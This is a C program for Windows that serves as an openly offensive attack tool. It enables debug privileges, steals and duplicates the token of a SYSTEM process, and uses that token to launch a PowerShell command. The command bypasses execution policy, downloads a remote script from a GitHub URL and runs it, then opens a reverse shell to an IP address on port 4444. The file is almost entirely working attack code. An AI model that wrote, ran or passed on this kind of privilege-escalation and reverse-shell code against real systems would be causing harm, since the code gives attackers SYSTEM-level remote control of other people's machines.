#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

void EnablePrivileges(HANDLE hToken, LPCSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    LookupPrivilegeValue(NULL, lpszPrivilege, &luid);

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
}

int main()
{
    int pid_to_impersonate = 592;  // Update this to the PID of a SYSTEM process
    HANDLE TokenHandle = NULL;
    HANDLE DuplicateTokenHandle = NULL;
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;
    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
    startupInfo.cb = sizeof(STARTUPINFO);

    HANDLE CurrentTokenHandle = NULL;
    BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle);

    EnablePrivileges(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);

    HANDLE rProc;
    rProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid_to_impersonate);

    BOOL rToken = OpenProcessToken(rProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
    BOOL impersonateUser = ImpersonateLoggedOnUser(TokenHandle);

    DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateTokenHandle);

    // Prepare the command to run (reverse shell command)
    char cmd[] = "powershell -NoP -NonI -W Normal -Exec Bypass -Command \"& {IEX (IWR 'https://raw.githubusercontent.com/anonymous300502/powershell_payload/main/Invoke-DopeShell.ps1' -UseBasicParsing) | Out-Null; Invoke-DopeShell '192.168.217.131' 4444 | Out-Null; }\"";


    wchar_t wcmd[256];
    mbstowcs(wcmd, cmd, strlen(cmd) + 1);

    CreateProcessWithTokenW(DuplicateTokenHandle, LOGON_WITH_PROFILE, NULL, wcmd, 0, NULL, NULL, &startupInfo, &processInformation);

    return 0;
}